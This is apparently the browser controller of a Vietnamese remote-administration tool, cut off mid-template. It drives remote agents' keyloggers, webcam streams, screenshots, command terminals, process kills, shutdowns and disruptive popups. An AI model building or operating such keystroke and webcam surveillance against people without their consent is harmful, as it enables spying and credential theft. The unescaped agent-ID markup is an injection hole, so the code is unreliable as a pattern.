import { CONFIG, state } from './config.js';
import * as Utils from './utils.js';
import * as Views from './Views/index.js';
import { startSignalR, sendCommand, requestAgentList } from './network.js';
import {processInputKey, renderDiskInfo, handleChatMessage, appendMessageToUI } from './utils.js';


let previousObjectUrl = null;

// Kiểm tra xem phần tử có tồn tại không trước khi gán
const agentIdDisplay = document.getElementById('agent-id-display');
if (agentIdDisplay) agentIdDisplay.textContent = CONFIG.AGENT_ID;


// --- 1. CÁC HÀM CALLBACK XỬ LÝ DỮ LIỆU (BẮT BUỘC PHẢI CÓ) ---

const originalAttachViewListeners = window.attachViewListeners || function(){};

function handleResponse(data) {
    if (!data) return;

    if (data.action === 'sys_specs') {
        const specs = data.response; // Object chứa: CpuName, GpuName, ...
        
        // Helper gán text an toàn
        const setText = (id, val) => { const el = document.getElementById(id); if(el) el.textContent = val; };


        setText('spec-cpu-name', specs.cpuName);
        setText('spec-cpu-cores', specs.cpuCores);
        setText('spec-ram-total-1', specs.totalRam);
        setText('spec-ram-total-2', specs.totalRam);
        setText('spec-ram-detail', specs.ramDetail);
        setText('spec-gpu', specs.gpuName);
        setText('spec-os', specs.osName);
        setText('spec-ip', `IP: ${specs.localIp} \nMAC: ${specs.macAddress}`);
        setText('spec-uptime', `Uptime: ${specs.uptime}`);
        setText('spec-disk', renderDiskInfo(specs.diskInfo));
        
        return;
    }

    if (state.currentView === 'applications' && Array.isArray(data.response)) {
        state.globalAppData = data.response;
        sortAndRenderApp();
    } 
    else if (state.currentView === 'processes' && Array.isArray(data.response)) {
        state.globalProcessData = data.response;
        sortAndRenderProcess();
    }
    else if (data.response === 'stopped') {
        if(state.currentView === 'keylogger') {
            const status = document.getElementById('keylogger-status');
            if(status) status.textContent = "Trạng thái: Đã dừng.";
        }
        if(state.currentView === 'applications') {
            sendCommand('app_list');
            setTimeout(() => {
                sendCommand('app_list');
            }, 100);
            setTimeout(() => {
                sendCommand('app_list');
            }, 1000);
        }
        
        // Reset Webcam UI
        if(state.currentView === 'webcam') {
            // 1. Đặt cờ ngưng nhận dữ liệu
            state.webcam.isStreaming = false;

            const vid = document.getElementById('webcam-stream');
            const ph = document.getElementById('webcam-placeholder');
            const stats = document.getElementById('webcam-stats-overlay');
            
            if(vid) { 
                vid.style.display = 'none'; 
                vid.src = ""; // Xóa dữ liệu ảnh cũ
                
                // Thu hồi Blob URL cũ ngay lập tức
                if (previousObjectUrl) {
                    URL.revokeObjectURL(previousObjectUrl);
                    previousObjectUrl = null;
                }
            }
            if(ph) { ph.style.display = 'flex'; ph.innerHTML = '<div id="webcam-placeholder" class="text-gray-500 dark:text-slate-500 flex flex-col items-center z-0 w-full h-full relative"><div class="box-of-star1"><div class="star star-position1"></div><div class="star star-position2"></div><div class="star star-position3"></div><div class="star star-position4"></div><div class="star star-position5"></div><div class="star star-position6"></div><div class="star star-position7"></div></div><div class="box-of-star2"><div class="star star-position1"></div><div class="star star-position2"></div><div class="star star-position3"></div><div class="star star-position4"></div><div class="star star-position5"></div><div class="star star-position6"></div><div class="star star-position7"></div></div><div class="box-of-star3"><div class="star star-position1"></div><div class="star star-position2"></div><div class="star star-position3"></div><div class="star star-position4"></div><div class="star star-position5"></div><div class="star star-position6"></div><div class="star star-position7"></div></div><div class="box-of-star4"><div class="star star-position1"></div><div class="star star-position2"></div><div class="star star-position3"></div><div class="star star-position4"></div><div class="star star-position5"></div><div class="star star-position6"></div><div class="star star-position7"></div></div><div data-js="astro" class="astronaut"><div class="head"></div><div class="arm arm-left"></div><div class="arm arm-right"></div><div class="body"><div class="panel"></div></div><div class="leg leg-left"></div><div class="leg leg-right"></div><div class="schoolbag"></div></div><div id="webcam-status-msg" class="absolute bottom-10 left-0 right-0 text-center z-30"><p class="text-slate-400 text-sm font-medium bg-slate-900/50 inline-block px-4 py-2 rounded-full backdrop-blur-sm border border-slate-700">Waiting for connection...</p></div></div>'; }
            if(stats) stats.style.display = 'none';
            state.webcam.currentFPS = 0;
        }
    }
    else if (data.response === 'started') {
        if(state.currentView === 'applications') setTimeout(() => sendCommand('app_list'), 500);
        if(state.currentView === 'processes') sendCommand('process_list');
    }
    else if (data.response === 'killed' && state.currentView === 'processes') {
        sendCommand('process_list');
    }
    else if (data.response === 'done' || data.response === 'ok') {
        Utils.showModal("Thông báo", "Thao tác thành công.", null, true);
    }
}

function handleRealtimeUpdate(data) {
    if (state.currentView === 'keylogger' && data.event === 'key_pressed') {
        const rawKey = data.data;

        // 1. Cập nhật Raw Log (Thô)
        const logRaw = document.getElementById('keylogger-log-raw');
        if (logRaw) {
            logRaw.value += rawKey;
            logRaw.scrollTop = logRaw.scrollHeight;
            state.keylogger.rawBuffer += rawKey;
        }

        // 2. Cập nhật Processed Log (Văn bản sạch)
        const logProcessed = document.getElementById('keylogger-log-processed');
        const modeSelect = document.getElementById('keylog-mode');
        
        if (logProcessed) {
            const currentMode = modeSelect ? modeSelect.value : 'english';
            const currentBuffer = state.keylogger.processedBuffer || "";

            // Gọi hàm xử lý thông minh
            const newText = processInputKey(currentBuffer, rawKey, currentMode);
            
            state.keylogger.processedBuffer = newText;
            logProcessed.value = newText;
            logProcessed.scrollTop = logProcessed.scrollHeight;
        }
    }

    if (state.currentView === 'terminal' && data.event === 'term_output') {
        const output = document.getElementById('terminal-output');
        if (output) {
            const line = document.createElement('div');
            line.textContent = data.data; // Dùng textContent để an toàn (chống XSS)
            line.className = "whitespace-pre-wrap break-words font-mono text-slate-300"; // Style cho dòng text
            
            output.appendChild(line);
            output.scrollTop = output.scrollHeight; // Auto scroll xuống đáy
        }
    }
}

function handleBinaryStream(imageData, frameSize = 0, senderTicks = 0) {
    const view = state.currentView;
    const nowPerf = performance.now();

    // Xử lý Screenshot
    if (view === 'screenshot' && state.screenshotPending && imageData) {
        const img = document.getElementById('screenshot-image');
        const placeholder = document.getElementById('screenshot-placeholder');
        const loader = document.getElementById('screenshot-loader');
        const saveBtn = document.getElementById('save-screenshot-btn');
        const info = document.getElementById('screenshot-info');
        const timeSpan = document.getElementById('screenshot-time');
        const filenameInputContainer = document.getElementById('screenshot-filename-container'); // Container ô nhập

        if (img) {
            // Xử lý dữ liệu ảnh base64
            img.src = imageData.startsWith('data:') ? imageData : "data:image/jpeg;base64," + imageData;
            
            img.classList.remove('hidden');
            if (loader) loader.classList.add('hidden');
            if (placeholder) placeholder.classList.add('hidden');
            
            // Hiển thị nút Lưu + Ô nhập tên file
            if (saveBtn) {
                saveBtn.classList.remove('hidden');
                saveBtn.classList.add('animate-bounce-in');
            }
            if (filenameInputContainer) {
                filenameInputContainer.classList.remove('hidden');
            }
            
            if (info && timeSpan) {
                info.classList.remove('hidden');
                const now = new Date();
                timeSpan.textContent = now.toLocaleTimeString('vi-VN');
            }

            state.screenshotPending = false;
        }
    }

    // Xử lý Webcam
    if (view === 'webcam' && imageData) {
        // QUAN TRỌNG: Kiểm tra cờ streaming. Nếu false thì bỏ qua gói tin này.
        if (state.webcam.isStreaming === false) return;

        const cam = state.webcam;
        
        cam.framesReceived++;
        cam.totalDataReceived += frameSize;
        cam.currentFrameSize = frameSize;

        if (nowPerf - cam.lastSampleTime >= CONFIG.SAMPLE_INTERVAL_MS) {
            cam.totalTimeElapsed = nowPerf - cam.lastSampleTime;
            cam.currentFPS = cam.framesReceived / (cam.totalTimeElapsed / 1000);
            updateWebcamStatsDisplay();
            cam.framesReceived = 0;
            cam.lastSampleTime = nowPerf;
        }
        cam.lastFrameTime = nowPerf;

        const video = document.getElementById('webcam-stream');
        const placeholder = document.getElementById('webcam-placeholder');
        
        if (video) {
            if (placeholder) placeholder.style.display = 'none';
            video.style.display = 'block';

            try {
                const base64Data = imageData.replace(/^data:image\/(png|jpeg|webp);base64,/, "");
                const binaryString = atob(base64Data); 
                const len = binaryString.length;
                const bytes = new Uint8Array(len);
                for (let i = 0; i < len; i++) {
                    bytes[i] = binaryString.charCodeAt(i);
                }
                const blob = new Blob([bytes], { type: "image/webp" });

                if (previousObjectUrl) {
                    URL.revokeObjectURL(previousObjectUrl);
                }

                const newUrl = URL.createObjectURL(blob);
                video.src = newUrl;
                previousObjectUrl = newUrl;
            } catch (err) {
                console.error("Blob error:", err);
            }
        }
    }
}

function updateWebcamStatsDisplay() {
    const overlay = document.getElementById('webcam-stats-overlay');
    if (!overlay) return;
    
    if (state.webcam.isStatsVisible) {
        const bitrateKBps = (state.webcam.currentFrameSize / 1024) * state.webcam.currentFPS;
        overlay.innerHTML = `
            <div class="text-sm font-mono text-white/90 p-2 space-y-0.5">
                <p>FPS: <span class="font-bold text-green-400">${state.webcam.currentFPS.toFixed(1)}</span></p>
                <p>Ping: <span class="font-bold text-green-400">${state.webcam.currentPing.toFixed(2)}</span></p>
                <p>Rate: <span class="font-bold text-purple-400">${bitrateKBps.toFixed(1)} KB/s</span></p>
                <p>Size: <span class="font-bold text-slate-300">${(state.webcam.currentFrameSize / 1024).toFixed(1)} KB</span></p>
            </div>`;
    } else {
        overlay.innerHTML = `<p class="text-white bg-red-600 text-xs px-2 py-1 rounded font-bold uppercase tracking-widest">LIVE</p>`;
    }
    overlay.style.display = 'block';
}

// --- 2. LOGIC SẮP XẾP ---

window.handleSortProcess = (column) => {
    if (state.currentSort.column === column) {
        state.currentSort.direction = state.currentSort.direction === 'asc' ? 'desc' : 'asc';
    } else {
        state.currentSort.column = column;
        state.currentSort.direction = (column === 'name') ? 'asc' : 'desc';
    }
    const container = document.getElementById('content-area');
    if(container) {
       container.innerHTML = Views.renderProcessLayout();
       attachViewListeners('processes');
    }
    sortAndRenderProcess();
};

window.handleSortApp = (column) => {
    if (state.currentAppSort.column === column) {
        state.currentAppSort.direction = state.currentAppSort.direction === 'asc' ? 'desc' : 'asc';
    } else {
        state.currentAppSort.column = column;
        state.currentAppSort.direction = 'asc';
    }
    document.getElementById('content-area').innerHTML = Views.renderAppLayout();
    attachViewListeners('applications');
    sortAndRenderApp();
};

function sortAndRenderProcess() {
    if (!state.globalProcessData) return;
    const { column, direction } = state.currentSort;
    const sorted = [...state.globalProcessData].sort((a, b) => {
        let valA, valB;
        if (column === 'pid') { valA = parseInt(a.pid); valB = parseInt(b.pid); }
        else if (column === 'name') { valA = (a.name||'').toLowerCase(); valB = (b.name||'').toLowerCase(); }
        else if (column === 'cpu') { valA = parseFloat(a.cpu?.replace('%','')||0); valB = parseFloat(b.cpu?.replace('%','')||0); }
        else if (column === 'disk') { 
            const parseDisk = (s) => {
                if(!s) return 0;
                let v = parseFloat(s.replace(/[^\d.]/g, '')) || 0;
                if(s.includes('MB/s')) v *= 1024;
                return v;
            };
            valA = parseDisk(a.disk);
            valB = parseDisk(b.disk);
        }
        else { valA = parseFloat(a.mem?.replace(/[^\d]/g,'')||0); valB = parseFloat(b.mem?.replace(/[^\d]/g,'')||0); }
        
        if (valA < valB) return direction === 'asc' ? -1 : 1;
        if (valA > valB) return direction === 'asc' ? 1 : -1;
        return 0;
    });
    Views.updateProcessTable(sorted);
}

function sortAndRenderApp() {
    if (!state.globalAppData) return;
    const { column, direction } = state.currentAppSort;
    const sorted = [...state.globalAppData].sort((a, b) => {
        let valA = (a[column] || '').toString().toLowerCase();
        let valB = (b[column] || '').toString().toLowerCase();
        
        if (valA < valB) return direction === 'asc' ? -1 : 1;
        if (valA > valB) return direction === 'asc' ? 1 : -1;
        return 0;
    });
    Views.updateAppTable(sorted);
}

// --- 3. CONTROLLER & EVENTS ---

function switchView(view) {
    state.currentView = view;
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.classList.remove('active');
        if(btn.dataset.view === view) btn.classList.add('active');
    });

    const area = document.getElementById('content-area');
    if (!area) return;
    
    let html = '';
    switch (view) {
        case 'applications': html = Views.renderAppLayout(); setTimeout(() => sendCommand('app_list'), 100); break;
        case 'processes': html = Views.renderProcessLayout(); 
            setTimeout(() => {
                sendCommand('process_list'); // Lấy danh sách tiến trình (động)
                sendCommand('sys_specs');    // Lấy thông số kỹ thuật (tĩnh) - MỚI
            }, 100); 
            break;
        case 'screenshot': html = Views.renderScreenshotView(); break;
        case 'keylogger': html = Views.renderKeyloggerDisplay(); break;
        case 'webcam': html = Views.renderWebcamControl(); break;
        case 'system': 
            html = Views.renderSystemControls(); 
            // THÊM: Gửi lệnh lấy thông số khi vào tab System
            setTimeout(() => sendCommand('sys_specs'), 100); 
            break;
        case 'terminal': 
            html = Views.renderTerminalLayout(); 
            // Tự động khởi động phiên CMD khi vừa vào tab
            setTimeout(() => sendCommand('term_start'), 500);
            break;
        case 'automation': 
            html = Views.renderAutomationLayout(); 
            break;
        case 'about':
            html = Views.renderAboutLayout();
            break;
    }
    
    area.innerHTML = html;
    attachViewListeners(view);
}

function attachViewListeners(view) {
    if (view === 'applications') {
        const btnRefresh = document.getElementById('list-apps-btn');
        if(btnRefresh) btnRefresh.onclick = () => {
            const tbody = document.getElementById('app-list-body');
            if(tbody) tbody.innerHTML = Utils.getLoadingRow(4);
            sendCommand('app_list');
        };
        const btnStart = document.getElementById('start-app-btn');
        const inputStart = document.getElementById('app-search name');
        if(btnStart && inputStart) {
            // Hàm xử lý gửi lệnh mở
            const handleStartApp = () => {
                const name = inputStart.value.trim();
                if (!name) {
                    alert("Vui lòng nhập tên ứng dụng (vd: chrome) hoặc đường dẫn!");
                    return;
                }

                // 1. Hiệu ứng Loading
                const originalContent = btnStart.innerHTML;
                btnStart.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
                btnStart.disabled = true;

                // 2. Gửi lệnh
                sendCommand('app_start', { name });

                // 3. Reset giao diện sau 1s (để người dùng biết đã bấm)
                setTimeout(() => {
                    btnStart.innerHTML = originalContent;
                    btnStart.disabled = false;
                    inputStart.value = ''; // Xóa ô nhập
                    
                    // Tự động làm mới danh sách sau 1.5s để thấy app chuyển trạng thái Running
                    setTimeout(() => sendCommand('app_list'), 1500);
                }, 1000);
            };

            // Sự kiện Click chuột
            btnStart.onclick = handleStartApp;

            // Sự kiện nhấn phím Enter trong ô input
            inputStart.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') handleStartApp();
            });
        }

        const tableBody = document.getElementById('app-list-body');
        if(tableBody) tableBody.addEventListener('click', (e) => {
            const stopBtn = e.target.closest('button[data-action="stop-app"]');
            const startBtn = e.target.closest('button[data-action="start-app"]');
            if (stopBtn) {
                const target = stopBtn.dataset.id; 
    
                Utils.showModal("Dừng App", `Dừng ứng dụng này?`, () => {
                    stopBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
                    sendCommand('app_stop', { name: target });
                });

                const name = stopBtn.dataset.name || stopBtn.dataset.id;
                Utils.showModal("Dừng App", `Dừng ứng dụng "${name}"?`, () => {
                    stopBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
                    sendCommand('app_stop', { name: stopBtn.dataset.id });
                });
            }
            if (startBtn) {
                // 1. Hiển thị loading để người dùng biết đang xử lý
                startBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
                
                // 2. Gửi lệnh mở ứng dụng
                // data-id của nút Start chứa đường dẫn hoặc tên ứng dụng cần mở
                sendCommand('app_start', { name: startBtn.dataset.id });

                // 3. Tự động làm mới danh sách sau 1.5s để cập nhật trạng thái "Running"
                // delay để ứng dụng kịp khởi động và xuất hiện trong danh sách process
                setTimeout(() => sendCommand('app_list'), 1500);
            }
        });
        const searchInput = document.getElementById('app-search');
        if (searchInput) {
            searchInput.addEventListener('keyup', (e) => {
                const term = e.target.value.toLowerCase();
                const rows = document.querySelectorAll('#app-list-body tr');
                
                rows.forEach(row => {
                    // Lấy text của cột Tên (cột đầu tiên)
                    const appName = row.querySelector('td:first-child')?.textContent.toLowerCase() || "";
                    
                    // Hiện nếu tên chứa từ khóa, ẩn nếu không chứa
                    if (appName.includes(term)) {
                        row.style.display = '';
                    } else {
                        row.style.display = 'none';
                    }
                });
            });
        }
    }
    else if (view === 'processes') {
        const btnList = document.getElementById('list-processes-btn');
        if(btnList) btnList.onclick = () => {
            document.getElementById('process-list-body').innerHTML = Utils.getLoadingRow(5);
            sendCommand('process_list');
        };
        const btnStart = document.getElementById('start-process-btn');
        if(btnStart) btnStart.onclick = () => {
             const path = prompt("Nhập đường dẫn/tên tiến trình:");
             if(path) sendCommand('process_start', { name: path });
        };
        const tableBody = document.getElementById('process-list-body');
        if(tableBody) tableBody.addEventListener('click', (e) => {
            const btn = e.target.closest('button[data-action="kill-process"]');
            if(btn) {
                const pid = btn.dataset.id;
                Utils.showModal("Kill Process", `PID ${pid}?`, () => sendCommand('process_stop', { pid: parseInt(pid) }));
            }
        });
        document.getElementById('process-search')?.addEventListener('keyup', (e) => {
            const term = e.target.value.toLowerCase();
            document.querySelectorAll('#process-list-body tr').forEach(row => {
                row.style.display = row.innerText.toLowerCase().includes(term) ? '' : 'none';
            });
        });
    }
   else if (view === 'screenshot') {
        const captureBtn = document.getElementById('capture-screenshot-btn');
        const saveBtn = document.getElementById('save-screenshot-btn');
        
        // Các elements của Modal
        const modal = document.getElementById('save-confirm-modal');
        const modalThumb = document.getElementById('modal-thumb-img');
        const modalDims = document.getElementById('modal-img-dims');
        const modalSize = document.getElementById('modal-img-size');
        const modalInput = document.getElementById('modal-filename-input');
        const modalCancel = document.getElementById('modal-cancel-btn');
        const modalDownload = document.getElementById('modal-download-btn');

        // Nút CHỤP
        if (captureBtn) {
            captureBtn.onclick = () => {
                const img = document.getElementById('screenshot-image');
                const placeholder = document.getElementById('screenshot-placeholder');
                const loader = document.getElementById('screenshot-loader');
                const info = document.getElementById('screenshot-info');

                // Reset UI
                if (img) img.classList.add('hidden');
                if (saveBtn) saveBtn.classList.add('hidden');
                if (info) info.classList.add('hidden');
                
                if (placeholder) placeholder.classList.add('hidden');
                if (loader) loader.classList.remove('hidden');

                state.screenshotPending = true;
                sendCommand('screenshot');
            };
        }

        // Nút LƯU (Mở Modal)
        if (saveBtn) {
            saveBtn.onclick = () => {
                const img = document.getElementById('screenshot-image');
                
                if (modal && img) {
                    // 1. Lấy thông tin từ ảnh gốc
                    modalThumb.src = img.src;
                    
                    // Lấy kích thước thực của ảnh
                    const width = img.naturalWidth;
                    const height = img.naturalHeight;
                    modalDims.textContent = `${width} x ${height} px`;

                    // Ước tính dung lượng (Base64 length * 0.75)
                    const base64Length = img.src.length - 'data:image/png;base64,'.length;
                    const sizeInBytes = base64Length * 0.75;
                    const sizeInKB = (sizeInBytes / 1024).toFixed(1);
                    modalSize.textContent = `~${sizeInKB} KB`;

                    // Đặt tên mặc định
                    const now = new Date();
                    const defaultName = `Screen_${now.getHours()}h${now.getMinutes()}_${now.getDate()}-${now.getMonth()+1}`;
                    modalInput.value = defaultName;

                    // 2. Hiện Modal
                    modal.classList.remove('hidden');
                    setTimeout(() => modalInput.focus(), 100);
                }
            };
        }

        // Xử lý trong Modal: Nút HỦY
        if (modalCancel) {
            modalCancel.onclick = () => {
                modal.classList.add('hidden');
            };
        }

        // Xử lý trong Modal: Nút TẢI VỀ
        if (modalDownload) {
            modalDownload.onclick = () => {
                const img = document.getElementById('screenshot-image');
                if (img) {
                    const link = document.createElement('a');
                    link.href = img.src;
                    
                    let fileName = modalInput.value.trim();
                    if (!fileName) fileName = "Screenshot"; // Fallback nếu xóa hết tên
                    
                    // Tự động thêm đuôi .png nếu chưa có
                    if (!fileName.toLowerCase().endsWith('.png')) {
                        fileName += '.png';
                    }

                    link.download = fileName;
                    link.click();
                    
                    // Tải xong thì đóng modal
                    modal.classList.add('hidden');
                }
            };
        }
        
        // Cho phép ấn Enter trong ô input để tải luôn
        if (modalInput) {
            modalInput.onkeypress = (e) => {
                if (e.key === 'Enter') modalDownload.click();
            };
        }
    }
    else if (view === 'keylogger') {
        const statusText = document.getElementById('keylogger-status');
        const statusDot = document.getElementById('keylog-status-dot');
        const modeSelect = document.getElementById('keylog-mode');
        const modeBadge = document.getElementById('mode-badge');

        // Nút Start
        document.getElementById('start-keylogger-btn').onclick = () => {
            sendCommand('keylogger_start');
            
            // UI Update: Active
            if(statusText) {
                statusText.textContent = "Recording keystrokes...";
                statusText.className = "text-xs text-green-600 dark:text-green-400 font-bold animate-pulse";
            }
            if(statusDot) {
                statusDot.className = "w-1.5 h-1.5 rounded-full bg-green-500 shadow-[0_0_8px_rgba(34,197,94,0.8)] animate-pulse";
            }
        };

        // Nút Stop
        document.getElementById('stop-keylogger-btn').onclick = () => {
            sendCommand('keylogger_stop');
            
            // UI Update: Inactive
            if(statusText) {
                statusText.textContent = "Monitoring paused";
                statusText.className = "text-xs text-slate-500 dark:text-slate-400 font-medium";
            }
            if(statusDot) {
                statusDot.className = "w-1.5 h-1.5 rounded-full bg-red-500";
            }
        };

        // Nút Clear
        document.getElementById('clear-keylogger-btn').onclick = () => {
            const raw = document.getElementById('keylogger-log-raw');
            const proc = document.getElementById('keylogger-log-processed');
            if(raw) raw.value = '';
            if(proc) proc.value = '';
            state.keylogger.rawBuffer = "";
            state.keylogger.processedBuffer = "";
        };

        // Logic đổi chế độ gõ (Update Badge hiển thị)
        if (modeSelect) {
            // Set giá trị mặc định từ state
            modeSelect.value = state.keylogger.mode || 'english';
            
            modeSelect.addEventListener('change', (e) => {
                state.keylogger.mode = e.target.value;
                if(modeBadge) {
                    modeBadge.textContent = e.target.value === 'telex' ? 'VIETNAMESE' : 'ENGLISH';
                }
            });
        }

        // Logic Tải về
        document.getElementById('download-keylog-btn').onclick = () => {
            const text = state.keylogger.processedBuffer;
            if (!text) { 
                Utils.showModal("Thông báo", "Chưa có dữ liệu để xuất file!", null, true);
                return; 
            }
            
            const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            // Tên file: Keylog_HH-mm-ss.txt
            const now = new Date();
            const timeStr = `${now.getHours()}h${now.getMinutes()}m`;
            a.download = `Keylog_Export_${timeStr}.txt`;
            a.click();
            URL.revokeObjectURL(url);
        };
    }
    else if (view === 'webcam') {
        const dot = document.getElementById('cam-status-dot');
        const statusText = document.getElementById('cam-status-text');
        const msg = document.getElementById('webcam-status-msg');

        document.getElementById('webcam-on-btn').onclick = () => {
            state.webcam.isStreaming = true;
            sendCommand('webcam_on');
            
            // Cập nhật UI Header: Online
            if(dot) dot.className = "w-1.5 h-1.5 rounded-full bg-green-500 shadow-[0_0_5px_rgba(34,197,94,0.8)] animate-pulse";
            if(statusText) {
                statusText.textContent = "Live Streaming";
                statusText.className = "text-xs text-green-600 dark:text-green-400 font-bold";
            }

            // Hiện loader trong placeholder
            if (msg) msg.innerHTML = `
                <div class="flex flex-col items-center">
                    <div class="w-5 h-5 border-2 border-slate-400 border-t-white rounded-full animate-spin mb-2"></div>
                    <span class="text-white text-xs bg-slate-800/80 px-3 py-1 rounded-full">Connecting via UDP...</span>
                </div>
            `;
            
            updateWebcamStatsDisplay();
        };

        document.getElementById('webcam-off-btn').onclick = () => {
            // Tắt ghi hình nếu đang ghi
            if (state.webcam.isRecording) toggleRecording();
            
            state.webcam.isStreaming = false;
            sendCommand('webcam_off');

            // Cập nhật UI Header: Offline
            if(dot) dot.className = "w-1.5 h-1.5 rounded-full bg-slate-300 dark:bg-slate-600";
            if(statusText) {
                statusText.textContent = "Camera Offline";
                statusText.className = "text-xs text-slate-500 dark:text-slate-400 font-medium";
            }
            
            // Reset msg
            if (msg) msg.innerHTML = `<p class="text-slate-400 text-sm font-medium bg-slate-900/50 inline-block px-4 py-2 rounded-full backdrop-blur-sm border border-slate-700">Device disconnected</p>`;
        };

        // ... Các event listener khác (record, stats) giữ nguyên logic gọi hàm ...
        document.getElementById('record-btn').onclick = toggleRecording;
        
        document.getElementById('toggle-stats-btn').onclick = () => {
            state.webcam.isStatsVisible = !state.webcam.isStatsVisible;
            const btn = document.getElementById('toggle-stats-btn');
            // Đổi màu nút stats
            btn.classList.toggle('text-blue-600', state.webcam.isStatsVisible);
            btn.classList.toggle('border-blue-500', state.webcam.isStatsVisible);
            btn.classList.toggle('bg-blue-50', state.webcam.isStatsVisible);
            updateWebcamStatsDisplay();
        };
    }
    else if (view === 'system') {
        document.getElementById('shutdown-btn').onclick = () => Utils.showModal("CẢNH BÁO", "Tắt máy Agent?", () => sendCommand('shutdown'));
        document.getElementById('restart-btn').onclick = () => Utils.showModal("CẢNH BÁO", "Khởi động lại Agent?", () => sendCommand('restart'));
    }
    else if (view === 'terminal') {
        const input = document.getElementById('terminal-input');
        const output = document.getElementById('terminal-output');
        const btnStart = document.getElementById('term-start-btn');
        const btnClear = document.getElementById('term-clear-btn');

        if (input) {
            setTimeout(() => input.focus(), 100);
            input.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    const cmd = input.value.trim();
                    if (cmd) {
                        if (output) {
                            const myLine = document.createElement('div');
                            myLine.textContent = `> ${cmd}`;
                            myLine.className = "text-yellow-400 font-bold mt-2 mb-1 border-b border-white/10 pb-1";
                            output.appendChild(myLine);
                            output.scrollTop = output.scrollHeight;
                        }
                        sendCommand('term_input', { cmd: cmd });
                        input.value = '';
                    }
                }
            });
        }
        
        if (btnClear) btnClear.onclick = () => { if(output) output.innerHTML = ''; };
        
        // SỬA: Logic Restart Session đúng nghĩa
        if (btnStart) btnStart.onclick = () => {
            // 1. Gửi lệnh STOP trước để giết tiến trình cũ
            sendCommand('term_stop');
            
            // 2. Thông báo trên màn hình
            if(output) {
                const line = document.createElement('div');
                line.textContent = "--- RESTARTING SESSION ---";
                line.className = "text-orange-500 font-bold mt-4 mb-2 italic";
                output.appendChild(line);
                output.scrollTop = output.scrollHeight;
            }

            // 3. Đợi 500ms cho Agent dọn dẹp xong thì gửi lệnh START lại
            setTimeout(() => {
                if(output) output.innerHTML = ''; // Xóa sạch màn hình cho mới
                sendCommand('term_start');
            }, 800);
        };
    }
    else if (view === 'automation') {
        // 1. Gửi tin nhắn Popup
        const btnMsg = document.getElementById('send-msg-btn');
        const inputMsg = document.getElementById('msg-input');
        if (btnMsg) {
            btnMsg.onclick = () => {
                const text = inputMsg.value.trim();
                if(text) {
                    sendCommand('interact_msgbox', { text });
                    inputMsg.value = ''; // Xóa sau khi gửi
                    Utils.showModal("Thành công", "Đã gửi hộp thoại đến máy trạm.", null, true);
                }
            };
        }

        // 2. Gửi lệnh Nói (TTS)
        const btnTts = document.getElementById('send-tts-btn');
        const inputTts = document.getElementById('tts-input');
        if (btnTts) {
            btnTts.onclick = () => {
                const text = inputTts.value.trim();
                if(text) {
                    sendCommand('interact_tts', { text });
                    inputTts.value = '';
                }
            };
        }

        // 3. Macro Panic
        const btnPanic = document.getElementById('macro-panic');
        if (btnPanic) {
            btnPanic.onclick = () => {
                if(confirm("Bạn có chắc chắn muốn kích hoạt chế độ này? Nó sẽ làm gián đoạn người dùng.")) {
                    sendCommand('interact_macro', { type: 'panic_mode' });
                }
            };
        }

        // 4. Macro Work
        const btnWork = document.getElementById('macro-work');
        if (btnWork) {
            btnWork.onclick = () => sendCommand('interact_macro', { type: 'open_workspace' });
        }

        const chatInput = document.getElementById('chat-input');
        const sendBtn = document.getElementById('send-chat-btn');
        const clearBtn = document.getElementById('clear-chat-btn');

        const sendMessage = () => {
            const text = chatInput.value.trim();
            if (!text) return;
            
            // 1. Gửi lệnh đi
            // action: 'chat_message', params: { text: ... }
            sendCommand('chat_message', { text });

            // 2. Hiện tin nhắn của mình lên ngay lập tức
            const now = new Date().toLocaleTimeString('vi-VN', { hour: '2-digit', minute: '2-digit' });
            appendMessageToUI('Me', text, now, 'sent');
            
            chatInput.value = '';
            chatInput.focus();
        };

        if (sendBtn) sendBtn.onclick = sendMessage;
        if (chatInput) chatInput.onkeypress = (e) => { if(e.key === 'Enter') sendMessage(); };
        
        if (clearBtn) clearBtn.onclick = () => {
            const chatBox = document.getElementById('chat-messages');
            if(chatBox) chatBox.innerHTML = '<div class="flex justify-center"><span class="text-[10px] text-slate-400 bg-slate-100 px-2 py-1 rounded-full">Đã xóa lịch sử chat</span></div>';
        };
    }
}

// --- INIT ---

function doLogin(username, password) {
    const btnText = document.getElementById('btn-text');
    const btnLoader = document.getElementById('btn-loader');
    const errorMsg = document.getElementById('login-error');
    const loginBtn = document.getElementById('login-btn');
    
    // SỬA LỖI: Xóa dấu phẩy thừa ở đây
    const ipInput = document.getElementById("server-ip").value.trim(); 
    
    // Nếu để trống thì mặc định localhost
    const serverIp = ipInput || "localhost";
    const dynamicUrl = `http://${serverIp}:5000/clienthub`;

    btnText.textContent = "Đang xác thực...";
    btnLoader.classList.remove('hidden');
    errorMsg.classList.add('hidden');
    loginBtn.disabled = true;

    const callbacks = {
        onResponse: handleResponse,
        onUpdate: handleRealtimeUpdate,
        onBinary: handleBinaryStream,
        onChatMessage: handleChatMessage,

        // QUAN TRỌNG: Hàm này phải nằm TRONG object callbacks
        // [FILE: public/Js/main.js] - Trong object callbacks

        onAgentListUpdate: (agentList) => {
            console.log("📡 Danh sách Agent:", agentList);
            
            const listContainer = document.getElementById('agent-list-container');
            const badge = document.getElementById('agent-count-badge');
            const currentSelection = CONFIG.AGENT_ID;

            if (!listContainer) return;

            // 1. Cập nhật số lượng
            if (badge) badge.textContent = agentList ? agentList.length : 0;

            // 2. Xóa danh sách cũ
            listContainer.innerHTML = '';

            if (agentList && agentList.length > 0) {
                
                // --- RENDER DANH SÁCH ITEM ---
                agentList.forEach(agentId => {
                    const isSelected = (agentId === currentSelection);
                    
                    // HTML cho từng dòng Agent
                    const itemHTML = `
                        <li onclick="window.selectAgentItem('${agentId}')" 
                            class="cursor-pointer px-4 py-3 flex items-center justify-between group hover:bg-blue-50 dark:hover:bg-blue-900/20 transition-colors border-b border-slate-50 dark:border-slate-700/50 last:border-0">
                            
                            <div class="flex items-center gap-3">
